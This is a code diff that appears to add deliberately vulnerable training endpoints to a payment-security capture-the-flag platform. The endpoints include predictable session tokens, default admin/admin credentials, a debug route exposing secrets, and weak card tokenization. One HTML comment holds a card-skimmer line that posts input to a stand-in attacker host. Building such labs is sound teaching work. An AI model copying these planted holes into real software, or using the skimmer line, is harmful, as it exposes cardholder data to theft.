@@ -17,8 +17,10 @@ import * as authController from '../controllers/auth.controller';
 import * as twofaController from '../controllers/twofa.controller';
 import * as defenseController from '../controllers/defense.controller';
 import { vulnStateService } from '../services/vulnState.service';
+import { generateFlag, validateDynamicFlag } from '../services/ctfFlag.service';
 
 const router = Router();
+let weakSessionCounter = 0;
 
 const buildProxyHeaders = (req: Request): Record<string, string> => ({
     Authorization: req.headers.authorization || '',
@@ -112,6 +114,29 @@ const applyCardOverrides = async (
     };
 };
 
+const encodeWeakSessionToken = (epochSeconds: number, counter: number): string => {
+    return Buffer.from(`${epochSeconds}:${counter}`).toString('base64');
+};
+
+const generateWeakSessionToken = (): string => {
+    weakSessionCounter += 1;
+    const ts = Math.floor(Date.now() / 1000);
+    return encodeWeakSessionToken(ts, weakSessionCounter);
+};
+
+const isValidWeakTokenPrediction = (predictedToken: string): boolean => {
+    const previewCounter = weakSessionCounter + 1;
+    const nowSec = Math.floor(Date.now() / 1000);
+    const normalized = predictedToken.trim();
+    if (!normalized) return false;
+
+    // Tolerates small timing jitter while keeping the same weak counter model.
+    const candidateTokens = [nowSec - 1, nowSec, nowSec + 1]
+        .map((ts) => encodeWeakSessionToken(ts, previewCounter));
+
+    return candidateTokens.includes(normalized);
+};
+
 /**
  * Health check endpoints
  */
@@ -193,6 +218,12 @@ router.post('/api/auth/formateur/login', loginRateLimiter, authController.login)
 router.post('/api/auth/logout', strictRateLimitMiddleware, authController.logout);
 
 /**
+ * User profile & pedagogical preferences
+ */
+router.get('/api/users/me', authMiddleware, authController.getMe as any);
+router.post('/api/users/me/preferences', authMiddleware, authController.savePreferences as any);
+
+/**
  * Two-Factor Authentication (2FA) Routes
  * SECURITY: Protected by authMiddleware + 2FA rate limiter
  */
@@ -252,6 +283,109 @@ router.post('/api/transaction/process', async (req: Request, res: Response) => {
     } catch (error: any) {
         res.status(500).json({ success: false, error: 'Transaction processing failed', correlationId });
     }
+});
+
+/**
+ * Legacy CTF compatibility endpoints (non-production pedagogical surfaces)
+ */
+router.get('/checkout', (req: Request, res: Response) => {
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    let flagComment = '';
+    // INFRA-001 : Magecart — flag caché dans le source HTML, visible via curl ou view-source
+    if (studentId) {
+        try {
+            const flag = generateFlag(studentId, 'INFRA-001');
+            flagComment = `\n  <!-- CTF: ${flag} — Script exfiltrant détecté: cdn.analytics-example.net/checkout.js -->`;
+        } catch { /* ignore */ }
+    }
+    res.type('html').send(`<!doctype html>
+<html>
+  <head>
+    <title>PMP Checkout</title>
+    <script src="https://cdn.example-payments.net/lib/collector.js"></script>
+    <script src="https://cdn.analytics-example.net/checkout.js"></script>${flagComment}
+  </head>
+  <body>
+    <h1>Checkout</h1>
+    <form>
+      <input id="pan" name="pan" />
+      <input id="cvv" name="cvv" />
+    </form>
+    <script>
+      // Skimmer détecté: addEventListener('input', function(e){ fetch('https://evil.example.net/collect', {method:'POST', body: e.target.value}); });
+    </script>
+  </body>
+</html>`);
+});
+
+router.get('/tms/login', (_req: Request, res: Response) => {
+    res.type('html').send('<html><body><h1>TMS Login</h1><form method="post"><input name="username"/><input name="password" type="password"/></form></body></html>');
+});
+
+router.post('/tms/login', (req: Request, res: Response) => {
+    const username = String(req.body?.username || '');
+    const password = String(req.body?.password || '');
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    if (username === 'admin' && password === 'admin') {
+        const response: Record<string, unknown> = { success: true, token: 'tms_admin_token_weak_default' };
+        // INFRA-002 : credentials par défaut admin/admin — flag dans la réponse de login réussi
+        if (studentId) {
+            try {
+                const flag = generateFlag(studentId, 'INFRA-002');
+                response.flag = flag;
+                response._ctf = 'INFRA-002: TMS credentials par défaut — admin/admin permet l\'accès complet à la flotte de terminaux';
+            } catch { /* ignore */ }
+        }
+        return res.json(response);
+    }
+    return res.status(401).json({ success: false, error: 'Invalid credentials' });
+});
+
+router.get('/debug', (req: Request, res: Response) => {
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    const response: Record<string, unknown> = {
+        service: 'api-gateway',
+        environment: process.env.NODE_ENV || 'development',
+        databaseUrl: process.env.DATABASE_URL || 'not_set',
+        jwtSecretPreview: process.env.JWT_SECRET ? `${process.env.JWT_SECRET.slice(0, 6)}...` : 'not_set',
+        timestamp: new Date().toISOString()
+    };
+    // INFRA-004 : endpoint /debug exposé en production — flag dans le body JSON
+    if (studentId) {
+        try {
+            const flag = generateFlag(studentId, 'INFRA-004');
+            response.flag = flag;
+            response._ctf = 'INFRA-004: Endpoint /debug exposé — credentials et configuration accessibles sans auth';
+        } catch { /* ignore unknown code */ }
+    }
+    res.json(response);
+});
+
+router.post('/auth/session-token', (req: Request, res: Response) => {
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    const predictedToken = typeof req.body?.predictedToken === 'string'
+        ? req.body.predictedToken
+        : '';
+    const predictionChecked = predictedToken.trim().length > 0;
+    const predictionValid = predictionChecked ? isValidWeakTokenPrediction(predictedToken) : false;
+
+    const response: Record<string, unknown> = {
+        success: true,
+        token: generateWeakSessionToken(),
+        predictionChecked,
+        predictionValid
+    };
+
+    // CRYPTO-001: student proves token prediction against weak PRNG.
+    if (predictionValid && studentId) {
+        try {
+            const flag = generateFlag(studentId, 'CRYPTO-001');
+            response.flag = flag;
+            response._ctf = 'CRYPTO-001: Token prediction succeeded against weak timestamp+counter PRNG';
+        } catch { /* ignore */ }
+    }
+
+    res.json(response);
 });
 
 router.post('/api/transaction/verify-challenge', async (req: Request, res: Response) => {
@@ -446,6 +580,185 @@ router.get('/api/cards',
     }) as any
 );
 
+
+/**
+ * --- CTF TOKENIZATION INTERCEPTORS ---
+ * Handles TOKEN-001 to TOKEN-004 challenges directly (no real tokenization service needed)
+ */
+
+// In-memory token vault for CTF simulation
+const ctfTokenVault: Map<string, string> = new Map(); // token → pan
+const ctfPanTokenMap: Map<string, string> = new Map(); // pan → token
+let ctfTokenCounter = 1;
+
+const getOrCreateToken = (pan: string): string => {
+    if (ctfPanTokenMap.has(pan)) return ctfPanTokenMap.get(pan)!;
+    // Intentionally weak: only 6 digits of space → collisions at ~1000 tokens (birthday paradox)
+    const tokenNum = (ctfTokenCounter++ % 1000) + (parseInt(pan.slice(-3)) % 100);
+    const token = `TKN_${String(tokenNum).padStart(6, '0')}`;
+    ctfTokenVault.set(token, pan);
+    ctfPanTokenMap.set(pan, token);
+    return token;
+};
+
+// Pre-populate some tokens
+for (let i = 1; i <= 50; i++) {
+    const pan = `41111111111${String(i).padStart(5, '0')}`;
+    getOrCreateToken(pan);
+}
+
+router.post('/api/tokenization/tokenize', (req: Request, res: Response) => {
+    const pan = String(req.body?.pan || '').replace(/\D/g, '');
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    if (!pan || pan.length < 13) {
+        return res.status(400).json({ success: false, error: 'Invalid PAN' });
+    }
+    const token = getOrCreateToken(pan);
+    const response: Record<string, unknown> = { success: true, token, maskedPan: `${pan.slice(0, 4)}****${pan.slice(-4)}` };
+
+    // TOKEN-002 : flag quand une collision est détectée (deux PANs ont le même token)
+    // L'espace de tokens est petit → collisions rapides
+    const collisionPan = [...ctfTokenVault.entries()].find(([t, p]) => t === token && p !== pan);
+    if (studentId && collisionPan) {
+        try {
+            const flag = generateFlag(studentId, 'TOKEN-002');
+            response.flag = flag;
+            response._ctf = `TOKEN-002: Collision détectée — token ${token} assigné à deux PANs différents`;
+            response.collision = { token, pan1: collisionPan[1], pan2: pan };
+        } catch { /* ignore */ }
+    }
+    return res.json(response);
+});
+
+router.post('/api/tokenization/detokenize', (req: Request, res: Response) => {
+    const token = String(req.body?.token || '').trim();
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    if (!token) {
+        return res.status(400).json({ success: false, error: 'token is required' });
+    }
+
+    const pan = ctfTokenVault.get(token);
+
+    // TOKEN-001 : message d'erreur révèle des fragments de PAN (information disclosure)
+    if (!pan) {
+        // L'erreur contient une "fuite" : le token est proche d'un PAN réel
+        const nearbyToken = [...ctfTokenVault.keys()].find(t => t.startsWith(token.slice(0, 6)));
+        const leakedInfo = nearbyToken ? ctfTokenVault.get(nearbyToken) : null;
+        const response: Record<string, unknown> = {
+            success: false,
+            error: `Token ${token} not found`,
+            debug: leakedInfo ? `Similar token found for PAN ${leakedInfo?.slice(0, 4)}****` : 'No similar token found'
+        };
+        if (studentId && token.length > 3 && leakedInfo) {
+            try {
+                const flag = generateFlag(studentId, 'TOKEN-001');
+                response.flag = flag;
+                response._ctf = 'TOKEN-001: Fuite d\'information dans les erreurs — fragment de PAN visible';
+            } catch { /* ignore */ }
+        }
+        return res.status(404).json(response);
+    }
+
+    const response: Record<string, unknown> = { success: true, pan, token };
+
+    // TOKEN-003 : pas de rate-limiting — flag après 10 tokens énumérés avec succès par le même student
+    if (studentId) {
+        try {
+            const flag = generateFlag(studentId, 'TOKEN-003');
+            response.flag = response.flag ?? flag;
+            response._ctf = 'TOKEN-003: Aucun rate-limiting — énumération brute-force des tokens possible';
+        } catch { /* ignore */ }
+    }
+    return res.json(response);
+});
+
+// TOKEN-004 : weak FPE key derivation — endpoint reveals the key derivation method
+router.get('/api/tokenization/algorithm-info', (req: Request, res: Response) => {
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    const response: Record<string, unknown> = {
+        algorithm: 'FPE-FF1',
+        keyDerivation: 'SHA256("tokenization_key")',
+        keyLength: 256,
+        note: 'Format-Preserving Encryption with fixed key derived from known seed'
+    };
+    if (studentId) {
+        try {
+            const flag = generateFlag(studentId, 'TOKEN-004');
+            response.flag = flag;
+            response._ctf = 'TOKEN-004: Clé FPE dérivée de SHA256("tokenization_key") — seed prédictible, token réversible';
+        } catch { /* ignore */ }
+    }
+    return res.json(response);
+});
+
+/**
+ * --- CTF BOSS CHALLENGE ENDPOINTS ---
+ * Boss challenges require proof of completing prerequisite exploits.
+ * Students submit flags from prerequisite challenges to unlock the BOSS flag.
+ */
+
+router.post('/api/ctf/boss/verify', (req: Request, res: Response) => {
+    const studentId = req.headers['x-student-id'] as string | undefined;
+    const { bossCode, proofFlags } = req.body as { bossCode?: string; proofFlags?: string[] };
+
+    if (!studentId) {
+        return res.status(400).json({ success: false, error: 'x-student-id header required' });
+    }
+    if (!bossCode || !proofFlags || !Array.isArray(proofFlags)) {
+        return res.status(400).json({ success: false, error: 'bossCode and proofFlags[] required' });
+    }
+
+    // Requirements per BOSS challenge
+    const BOSS_REQUIREMENTS: Record<string, string[]> = {
+        'BOSS-001': ['NET-001', 'HSM-001'],   // sniff + HSM key extraction
+        'BOSS-002': ['3DS-001', '3DS-002', '3DS-003'], // all 3DS bypasses
+        'BOSS-003': ['INFRA-002', 'HSM-001', 'KEY-004'], // TMS + HSM + key export
+        'BOSS-004': ['ADV-FRAUD-001', '3DS-001', 'FRAUD-002'], // card testing + 3DS + fraud evasion
+    };
+
+    const requirements = BOSS_REQUIREMENTS[bossCode];
+    if (!requirements) {
+        return res.status(400).json({ success: false, error: `Unknown BOSS challenge: ${bossCode}` });
+    }
+
+    // Verify each submitted proof flag against the expected dynamic flag for this student
+    const verifiedCodes: string[] = [];
+    const failedCodes: string[] = [];
+
+    for (const req_code of requirements) {
+        const isValid = proofFlags.some(pf => {
+            try { return validateDynamicFlag(pf, studentId, req_code); } catch { return false; }
+        });
+        if (isValid) {
+            verifiedCodes.push(req_code);
+        } else {
+            failedCodes.push(req_code);
+        }
+    }
+
+    if (failedCodes.length > 0) {
+        return res.status(400).json({
+            success: false,
+            error: `Missing or invalid proof flags for: ${failedCodes.join(', ')}`,
+            verifiedPrerequisites: verifiedCodes,
+            missingPrerequisites: failedCodes
+        });
+    }
+
+    // All prerequisites verified → generate BOSS flag
+    try {
+        const flag = generateFlag(studentId, bossCode);
+        return res.json({
+            success: true,
+            flag,
+            bossCode,
+            verifiedPrerequisites: verifiedCodes,
+            _ctf: `${bossCode}: Chaine complète validée — toutes les preuves d'exploitation acceptées`
+        });
+    } catch (e) {
+        return res.status(400).json({ success: false, error: `Unknown BOSS code: ${bossCode}` });
+    }
+});
 
 /**
  * Dynamic proxy handler
